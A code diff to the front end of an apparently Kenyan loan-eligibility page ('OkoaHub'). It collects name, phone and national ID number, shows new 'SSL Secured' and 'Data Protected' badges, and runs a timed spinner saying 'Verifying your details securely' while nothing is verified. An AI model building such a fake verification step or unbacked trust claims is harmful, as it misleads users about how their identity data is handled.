@@ -16,7 +16,7 @@
     
     <!-- SweetAlert -->
     <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.min.css" rel="stylesheet">
-    
+
     <style>
         :root {
             --green: #2e7d32;
@@ -61,21 +61,28 @@
             margin-bottom: 20px;
         }
 
+        /* --- Real logo --- */
         .logo {
-            font-weight: 700;
-            font-size: 1.5rem;
-            color: var(--green);
-            margin-bottom: 8px;
-            display: flex;
+            display: inline-flex;
             align-items: center;
             justify-content: center;
-            gap: 8px;
+            background: var(--cream);
+            padding: 10px 20px;
+            border-radius: 16px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.06);
+            margin-bottom: 10px;
+        }
+
+        .logo img {
+            height: 55px;
+            width: auto;
+            object-fit: contain;
         }
 
         .subtitle {
             color: var(--gray);
             font-size: 0.9rem;
-            margin-bottom: 4px;
+            margin-top: 4px;
         }
 
         .amount-range {
@@ -148,44 +155,50 @@
             margin-top: 16px;
         }
 
+        /* --- Horizontal Trust Badges --- */
         .trust-badges {
             display: flex;
             justify-content: center;
-            gap: 10px;
+            gap: 12px;
             margin: 16px 0;
-            flex-wrap: wrap;
+            flex-wrap: nowrap;
         }
 
         .trust-badge {
             background: var(--cream);
-            padding: 6px 12px;
+            padding: 6px 14px;
             border-radius: 20px;
-            font-size: 0.7rem;
+            font-size: 0.75rem;
             display: flex;
             align-items: center;
             gap: 6px;
+            white-space: nowrap;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.07);
         }
 
         .trust-badge i {
             color: var(--green);
-            font-size: 0.8rem;
+            font-size: 0.85rem;
         }
     </style>
 </head>
 
 <body>
+
     <div class="loan-card">
+        
         <div class="header">
             <div class="logo">
-                <i class="fas fa-hand-holding-usd"></i>
-                <span>OkoaHub</span>
+                <img src="icons/logo.png" alt="OkoaHub Logo">
             </div>
+
             <h2>Check Your Loan Eligibility</h2>
             <p class="subtitle">Find out how much you qualify for</p>
             <p class="amount-range">Ksh. 1,000 – 50,000</p>
         </div>
 
         <form id="eligibility_form" onsubmit="handleSubmit(event)">
+            
             <div class="form-group">
                 <input type="text" name="name" id="name" class="form-control" placeholder=" " required>
                 <label for="name" class="form-label">Full Name</label>
@@ -212,13 +225,18 @@
                 </select>
             </div>
 
+            <!-- Horizontal badges -->
             <div class="trust-badges">
                 <div class="trust-badge">
                     <i class="fas fa-lock"></i>
-                    <span>Secure Application</span>
+                    <span>SSL Secured</span>
                 </div>
                 <div class="trust-badge">
-                    <i class="fas fa-user-shield"></i>
+                    <i class="fas fa-shield-alt"></i>
+                    <span>Data Protected</span>
+                </div>
+                <div class="trust-badge">
+                    <i class="fas fa-user-check"></i>
                     <span>No CRB Check</span>
                 </div>
             </div>
@@ -229,79 +247,77 @@
             
             <p class="trust-note">No paperwork required. No guarantors needed.</p>
         </form>
+
     </div>
 
     <!-- SweetAlert JS -->
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.all.min.js"></script>
-    
+
     <script>
-    const nameRegex = /^[a-zA-Z\s.'-]{2,}$/;
-    const phoneRegex = /^(?:\+?254|0)[17]\d{8}$/; // Updated regex for all Kenyan numbers
-    const idRegex = /^\d{7,10}$/;
+        const nameRegex = /^[a-zA-Z\s.'-]{2,}$/;
+        const phoneRegex = /^(?:\+?254|0)[17]\d{8}$/;
+        const idRegex = /^\d{7,10}$/;
 
-    function handleSubmit(e) {
-        e.preventDefault();
-        const f = e.target;
-        const name = f.name.value.trim();
-        const phone = f.phone_number.value.trim();
-        const id = f.id_number.value.trim();
-        const type = f.loan_type.value;
+        function handleSubmit(e) {
+            e.preventDefault();
+            const f = e.target;
+            const name = f.name.value.trim();
+            const phone = f.phone_number.value.trim();
+            const id = f.id_number.value.trim();
+            const type = f.loan_type.value;
 
-        if (!nameRegex.test(name)) {
-            return Swal.fire('Invalid Name', 'Please enter your full name (letters only)', 'error');
-        }
-        if (!phoneRegex.test(phone)) {
-            return Swal.fire('Invalid Phone', 'Please enter a valid Kenyan phone number', 'error');
-        }
-        if (!idRegex.test(id)) {
-            return Swal.fire('Invalid ID', 'Please enter a valid Kenyan ID (7-10 digits)', 'error');
-        }
-        if (!type) {
-            return Swal.fire('Missing Loan Type', 'Please select your loan purpose', 'error');
+            if (!nameRegex.test(name)) {
+                return Swal.fire('Invalid Name', 'Please enter your full name (letters only)', 'error');
+            }
+            if (!phoneRegex.test(phone)) {
+                return Swal.fire('Invalid Phone', 'Please enter a valid Kenyan phone number', 'error');
+            }
+            if (!idRegex.test(id)) {
+                return Swal.fire('Invalid ID', 'Please enter a valid Kenyan ID (7-10 digits)', 'error');
+            }
+            if (!type) {
+                return Swal.fire('Missing Loan Type', 'Please select your loan purpose', 'error');
+            }
+
+            sessionStorage.setItem('myLoan', JSON.stringify({
+                name,
+                phone_number: phone,
+                id_number: id,
+                loan_type: type
+            }));
+
+            Swal.fire({
+                title: 'Checking Eligibility...',
+                html: 'Verifying your details securely.',
+                allowOutsideClick: false,
+                didOpen: () => Swal.showLoading()
+            });
+
+            setTimeout(() => {
+                Swal.close();
+                window.location.href = 'apply.html';
+            }, 2500);
         }
 
-        // Store data
-        sessionStorage.setItem('myLoan', JSON.stringify({
-            name,
-            phone_number: phone,
-            id_number: id,
-            loan_type: type
-        }));
+        window.onload = () => {
+            const data = JSON.parse(sessionStorage.getItem('myLoan') || '{}');
+            if (data.name) {
+                document.getElementById('name').value = data.name;
+                document.getElementById('name').dispatchEvent(new Event('input'));
+            }
+            if (data.phone_number) {
+                document.getElementById('phone_number').value = data.phone_number;
+                document.getElementById('phone_number').dispatchEvent(new Event('input'));
+            }
+            if (data.id_number) {
+                document.getElementById('id_number').value = data.id_number;
+                document.getElementById('id_number').dispatchEvent(new Event('input'));
+            }
+            if (data.loan_type) {
+                document.getElementById('loan_type').value = data.loan_type;
+            }
+        };
+    </script>
 
-        // Show loading
-        Swal.fire({
-            title: 'Checking Eligibility',
-            html: 'We\'re verifying your details...',
-            allowOutsideClick: false,
-            didOpen: () => Swal.showLoading()
-        });
-        
-        // Simulate API check
-        setTimeout(() => {
-            Swal.close();
-            window.location.href = 'apply.html';
-        }, 2500);
-    }
-
-    // Fill form if returning
-    window.onload = () => {
-        const data = JSON.parse(sessionStorage.getItem('myLoan') || '{}');
-        if (data.name) {
-            document.getElementById('name').value = data.name;
-            document.getElementById('name').dispatchEvent(new Event('input'));
-        }
-        if (data.phone_number) {
-            document.getElementById('phone_number').value = data.phone_number;
-            document.getElementById('phone_number').dispatchEvent(new Event('input'));
-        }
-        if (data.id_number) {
-            document.getElementById('id_number').value = data.id_number;
-            document.getElementById('id_number').dispatchEvent(new Event('input'));
-        }
-        if (data.loan_type) {
-            document.getElementById('loan_type').value = data.loan_type;
-        }
-    };
-</script>
 </body>
 </html>
